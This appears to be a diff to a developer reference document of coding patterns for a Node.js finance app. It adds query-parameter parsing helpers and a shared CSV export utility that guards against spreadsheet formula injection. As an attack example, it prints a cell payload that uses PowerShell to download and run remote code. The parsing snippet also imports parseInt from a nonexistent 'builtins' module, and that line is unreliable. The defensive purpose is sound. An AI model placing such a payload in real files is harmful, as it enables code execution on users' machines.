@@ -2,10 +2,10 @@
 title: Code Patterns Reference
 type: reference
 status: active
-date: 2026-04-24
-tags: [reference, patterns, conventions, code-style, backend, frontend, phase-0, phase-1, phase-2, phase-3, phase-4, phase-5, phase-6, phase-9, phase-c, motion, liquid-glass, design-system, decimal, money, timezone, openapi, domain-split, import, import-pipeline, concurrency, batching, decimal-enforcement, zustand, slice-selection, typescript, error-handling, type-safety]
-description: Standard code patterns used throughout the Vision project — repositories, routes, hooks, API client, Express setup, error handling, type safety, filter builders, aggregation envelopes, aggregation refresh, trigger-maintained tables, golden fixtures, database fixtures, pure calculation services, atomic multi-step transactions, streaming CSV exports, import batch concurrency, motion consumers, surface shells, gradient icon tiles, money utilities, decimal utilities, timezone boundary handling, TypeScript type annotations, type-safe error handling, domain-split API client, Zustand store with useShallow slice selection, and feature flags with admin API
-aliases: [code patterns, coding patterns, conventions, patterns, how to write code, repository pattern, route pattern, hook pattern, error handling, type-safe error handling, type annotations, filter builder, golden fixture, aggregation envelope, calculation services, import concurrency, motion pattern, surface shell pattern, gradient icon pattern, money pattern, decimal pattern, timezone pattern, domain split, openapi, typescript types]
+date: 2026-04-25
+tags: [reference, patterns, conventions, code-style, backend, frontend, phase-0, phase-1, phase-2, phase-3, phase-4, phase-5, phase-6, phase-9, phase-c, motion, liquid-glass, design-system, decimal, money, timezone, openapi, domain-split, import, import-pipeline, concurrency, batching, decimal-enforcement, zustand, slice-selection, typescript, error-handling, type-safety, csv, formula-injection, cwe-1236]
+description: Standard code patterns used throughout the Vision project — repositories, routes, hooks, API client, Express setup, error handling, type safety, filter builders, aggregation envelopes, aggregation refresh, trigger-maintained tables, golden fixtures, database fixtures, pure calculation services, atomic multi-step transactions, streaming CSV exports with formula injection prevention, import batch concurrency, motion consumers, surface shells, gradient icon tiles, money utilities, decimal utilities, timezone boundary handling, TypeScript type annotations, type-safe error handling, domain-split API client, Zustand store with useShallow slice selection, and feature flags with admin API
+aliases: [code patterns, coding patterns, conventions, patterns, how to write code, repository pattern, route pattern, hook pattern, error handling, type-safe error handling, type annotations, filter builder, golden fixture, aggregation envelope, calculation services, import concurrency, motion pattern, surface shell pattern, gradient icon pattern, money pattern, decimal pattern, timezone pattern, domain split, openapi, typescript types, csv export, safe csv, formula injection, cwe-1236]
 ---
 
 # Code Patterns Reference
@@ -721,6 +721,90 @@ export const apiClient = new ApiClient();
 
 ---
 
+## HTTP Request Parameter Parsing Pattern (Phase 10)
+
+**Source:** [[apps/node-backend/src/routes/aggregations.js|aggregations.js]], [[apps/node-backend/src/routes/info.js|info.js]]
+
+Query parameters from `req.query.*` are always strings (or string arrays if multi-valued). Safe parsing requires explicit validation, bounds checking, and fallback defaults to prevent type coercion bugs.
+
+### Pattern: `parseIntClamped()`
+
+Extracts and validates integer query parameters with configurable bounds:
+
+```js
+import { parseInt } from 'builtins';  // Standard parseInt, not a library
+
+function parseIntClamped(raw, { min = 1, max, fallback }) {
+  const parsed = parseInt(raw, 10);
+  if (!Number.isFinite(parsed) || parsed < min) return fallback;
+  return max != null ? Math.min(parsed, max) : parsed;
+}
+
+// Usage in route handlers
+router.get('/forecast', async (req, res) => {
+  // months: defaults to 3, accepts 1–24
+  const months = parseIntClamped(req.query.months, { max: 24, fallback: 3 });
+  // mcPaths: defaults to 1000, accepts 1–5000
+  const mcPaths = parseIntClamped(req.query.mc_paths, { max: 5000, fallback: 1000 });
+  // historyMonths: defaults to 36, accepts 1–120
+  const historyMonths = parseIntClamped(req.query.history_months, { max: 120, fallback: 36 });
+  
+  const { data, meta } = await computeCashflowForecast({ months, mcPaths, historyMonths });
+  res.ok({ data, meta });
+});
+```
+
+### Pattern: `parseNumericArrayQueryParam()`
+
+Extracts and validates arrays of numeric query parameters (e.g., multi-select filters):
+
+```js
+function parseNumericArrayQueryParam(raw) {
+  if (!raw) return [];
+  const values = Array.isArray(raw) ? raw : [raw];
+  return values
+    .map((v) => Number(v))
+    .filter((n) => Number.isFinite(n));
+}
+
+// Usage in route handlers
+router.get('/monthly-summary', async (req, res) => {
+  const { data, meta } = await computeMonthlySummary({
+    targetCurrency: getTargetCurrency(req),
+    excludedCategoryIds: parseNumericArrayQueryParam(req.query.excluded_category_ids),
+    excludedRecipientIds: parseNumericArrayQueryParam(req.query.excluded_recipient_ids),
+  });
+  res.ok({ data, meta });
+});
+```
+
+### Key Rules
+
+| Pattern | Rule |
+|---------|------|
+| `parseInt(raw, 10)` | Always radix 10 (avoid accidental octal from leading 0) |
+| Non-finite check | Reject NaN, Infinity, undefined parse results |
+| Bounds enforcement | Apply min (default 1) and max bounds; use `fallback` if out of range |
+| String arrays | Handle both single `?param=val` and multi `?param=val1&param=val2` |
+| Array filtering | Remove non-finite values, keep empty array if no matches |
+| Type narrowing | Results are always `number | number[]` or fallback type, never string |
+
+### When to Use
+
+- **Single integer param** — `parseIntClamped()` with max bounds
+- **Array of integers** — `parseNumericArrayQueryParam()` for filter arrays
+- **Currency strings** — Direct upper-casing and regex validation (3-letter ISO code)
+- **Boolean flags** — `=== 'true' || === '1'` string comparison (no parsing needed)
+- **Dates** — Treat as ISO strings, validate with Date constructor or date lib
+
+### When NOT to Use
+
+- **Path parameters** (e.g., `/resource/:id`) — Use Express route constraints or numeric middleware
+- **Request body** — Use schema validation (Zod) at middleware layer
+- **Header values** — Parse at middleware layer, attach to `req.locals`
+
+---
+
 ## Express App Setup
 
 **Source:** [[apps/node-backend/src/main.js|main.js]]
@@ -1292,48 +1376,79 @@ const outstanding = await query(
 
 ---
 
-## Streaming CSV Export Pattern (Phase 5)
+## Safe CSV Export Pattern (Phase 5+)
 
-**Source:** [[apps/node-backend/src/routes/transactions.js|transactions.js]] `GET /api/transactions/export/csv`
+**Source:** [[apps/node-backend/src/lib/csv.js|csv.js]] — Shared utility with formula injection guard
+**Used in:** [[apps/node-backend/src/routes/transactions.js|transactions.js]], [[apps/node-backend/src/routes/splits.js|splits.js]]
 
-For large exports, stream CSV in fixed-size chunks to keep memory bounded. Use a stable `ORDER BY` and accumulator-based running balance to ensure consistency across chunks.
+CSV exports must escape field values to prevent formula injection (CWE-1236). A centralized utility ensures all exports are protected.
 
-### Implementation
+### Safety Requirement: Formula Injection Prevention
+
+Excel and Google Sheets auto-execute leading `=`, `+`, `-`, or `@` as formulas. Example attack:
+
+```
+Cell value: =cmd|'/c powershell IEX(New-Object Net.WebClient).DownloadString(...)'
+Result: Arbitrary code execution when file is opened
+```
+
+**Solution:** Prefix dangerous leading characters with a single quote (`'`). The spreadsheet renders as literal text.
+
+### Shared Implementation
 
 ```js
-const CSV_EXPORT_CHUNK_SIZE = 1000;
+// apps/node-backend/src/lib/csv.js
+const DANGEROUS_CSV_FORMULA_PREFIXES = new Set(['=', '+', '-', '@']);
 
-function escapeCsvValue(value) {
-  if (value == null) return '';
-  // Neutralize formula prefixes
-  const string = value.toString();
-  if (/^[=+\-@]/.test(string.trimStart())) {
-    return `"'${string.replace(/"/g, '""')}"`;
-  }
-  return string.includes(',') || string.includes('"') || string.includes('\n')
-    ? `"${string.replace(/"/g, '""')}"`
-    : string;
+export function neutralizeCsvFormula(value) {
+  if (!value) return value;
+  const trimmedStart = value.trimStart();
+  if (!trimmedStart) return value;
+  const firstChar = trimmedStart.charAt(0);
+  if (!DANGEROUS_CSV_FORMULA_PREFIXES.has(firstChar)) return value;
+  return `'${value}`;  // Prefix dangerous char with '
 }
+
+export function escapeCsvValue(value) {
+  if (value == null) return '';
+  const stringValue = neutralizeCsvFormula(String(value));
+  return stringValue.includes(',') || stringValue.includes('"') || stringValue.includes('\n')
+    ? `"${stringValue.replace(/"/g, '""')}"`
+    : stringValue;
+}
+```
+
+### Usage in Routes
+
+Import the utility and use it to escape all user-controllable fields before CSV serialization:
+
+```js
+import { escapeCsvValue } from '../lib/csv.js';
 
 function buildTransactionCsvRow(row, { includeBalance = false } = {}) {
   const cols = [row.date, row.bank_account, row.recipient_name, row.memo,
                 row.amount, row.currency, row.balance, row.category_name, row.comment];
   if (includeBalance) cols.push(row.running_balance);
-  return cols.map(escapeCsvValue).join(',');
+  return cols.map(escapeCsvValue).join(',');  // ← All fields escaped
 }
+```
+
+### Streaming Large Exports
+
+For large datasets, stream in fixed-size chunks to keep memory bounded:
+
+```js
+const CSV_EXPORT_CHUNK_SIZE = 1000;
 
 router.get('/export/csv', rateLimiter(...), async (req, res) => {
   try {
-    const { include_balance } = req.query;
-    const includeBalance = include_balance === 'true';
-
-    // Build filter clauses (dynamic WHERE)
+    // Build filter clauses (dynamic WHERE with parameterized queries)
     const filterClauses = ['t.is_active = true'];
     const params = [];
     let paramIdx = 1;
-    // ... add date, category, bank_account filters ...
+    // ... add date, category, bank_account filters with params.push() ...
 
-    // Probe for existence before streaming
+    // Probe for empty results before streaming
     const probe = await dbQuery(
       `SELECT 1 FROM transactions t WHERE ${filterClauses.join(' AND ')} LIMIT 1`,
       params
@@ -1343,47 +1458,36 @@ router.get('/export/csv', rateLimiter(...), async (req, res) => {
     }
 
     // Set response headers
-    const filename = `transactions_export_${new Date().toISOString().slice(0, 19)}.csv`;
     res.setHeader('Content-Type', 'text/csv');
-    res.setHeader('Content-Disposition', `attachment; filename=${filename}`);
+    res.setHeader('Content-Disposition', `attachment; filename=transactions_export_${new Date().toISOString().slice(0, 19)}.csv`);
 
     // Write CSV header
-    const header = includeBalance
-      ? 'Date,Bank Account,Recipient,Memo,Amount,Currency,Balance,Category,Comment,Running Balance'
-      : 'Date,Bank Account,Recipient,Memo,Amount,Currency,Balance,Category,Comment';
-    res.write(header + '\n');
+    res.write('Date,Bank Account,Recipient,Memo,Amount,Currency,Balance,Category,Comment\n');
 
-    // Chunked streaming with running balance
-    const chunkSql = `
-      SELECT t.id, t.date, t.bank_account, 
-             COALESCE(pr.name, r.name) AS recipient_name,
-             t.memo, t.amount, t.currency, t.balance,
-             CASE WHEN c.id IS NOT NULL THEN c.general || ':' || c.detail ELSE '' END AS category_name,
-             t.comment
-      FROM transactions t
-      LEFT JOIN recipients r ON t.recipient_id = r.id
-      LEFT JOIN recipients pr ON r.primary_recipient_id = pr.id
-      LEFT JOIN categories c ON t.category_id = c.id
-      WHERE ${filterClauses.join(' AND ')}
-      ORDER BY t.date ASC, t.id ASC
-      LIMIT $${paramIdx} OFFSET $${paramIdx + 1}
-    `;
-
+    // Stream in chunks to bound memory
     let offset = 0;
-    let runningBalance = 0;
     while (true) {
+      const chunkSql = `
+        SELECT t.id, t.date, t.bank_account, 
+               COALESCE(pr.name, r.name) AS recipient_name,
+               t.memo, t.amount, t.currency, t.balance,
+               CASE WHEN c.id IS NOT NULL THEN c.general || ':' || c.detail ELSE '' END AS category_name,
+               t.comment
+        FROM transactions t
+        LEFT JOIN recipients r ON t.recipient_id = r.id
+        LEFT JOIN recipients pr ON r.primary_recipient_id = pr.id
+        LEFT JOIN categories c ON t.category_id = c.id
+        WHERE ${filterClauses.join(' AND ')}
+        ORDER BY t.date ASC, t.id ASC
+        LIMIT $${paramIdx} OFFSET $${paramIdx + 1}
+      `;
+      
       const chunk = await dbQuery(chunkSql, [...params, CSV_EXPORT_CHUNK_SIZE, offset]);
       if (chunk.rows.length === 0) break;
 
-      const lines = chunk.rows.map((row) => {
-        if (includeBalance) {
-          runningBalance += parseFloat(row.amount) || 0;
-          return buildTransactionCsvRow({ ...row, running_balance: runningBalance }, { includeBalance });
-        }
-        return buildTransactionCsvRow(row);
-      });
-
+      const lines = chunk.rows.map(row => buildTransactionCsvRow(row));
       res.write(lines.join('\n') + '\n');
+      
       if (chunk.rows.length < CSV_EXPORT_CHUNK_SIZE) break;
       offset += CSV_EXPORT_CHUNK_SIZE;
     }
@@ -1392,9 +1496,9 @@ router.get('/export/csv', rateLimiter(...), async (req, res) => {
   } catch (err) {
     logger.error('Error exporting', { error: err.message });
     if (!res.headersSent) {
-      res.status(500).json({ detail: 'Error exporting' });
+      res.status(500).json({ ok: false, error: { code: 'INTERNAL_SERVER_ERROR', message: 'Error exporting' } });
     } else {
-      res.end();
+      res.end();  // Headers already sent, close gracefully
     }
   }
 });
@@ -1404,13 +1508,12 @@ router.get('/export/csv', rateLimiter(...), async (req, res) => {
 
 | Pattern | Rule |
 |---------|------|
-| Chunk size | 1000–5000 rows per chunk depending on row width |
-| Stable sort | `ORDER BY date ASC, id ASC` ensures no gaps/dupes |
-| Running balance | Accumulated in JavaScript with JS number precision |
-| Formula safety | Prefix cells with `'` if they start with `=`, `+`, `-`, `@` |
-| Probe first | Check for empty results before streaming to return 404 with JSON |
-| Error recovery | If headers sent, close gracefully; otherwise return JSON error |
-| Rate limiting | Apply per-route limiter to protect DB from concurrent bulk exports |
+| **Escaping** | **All fields must use `escapeCsvValue()`** to prevent CWE-1236 formula injection |
+| **Chunk size** | 1000–5000 rows per chunk depending on row width; tuned to balance memory + latency |
+| **Stable sort** | `ORDER BY date ASC, id ASC` ensures no gaps or duplicate rows across chunks |
+| **Probe first** | Check for empty results before streaming headers (early 404 return) |
+| **Error recovery** | If headers sent, close gracefully (`res.end()`); otherwise return JSON error |
+| **Rate limiting** | Apply per-route limiter to protect DB from concurrent bulk exports |
 
 ---
 
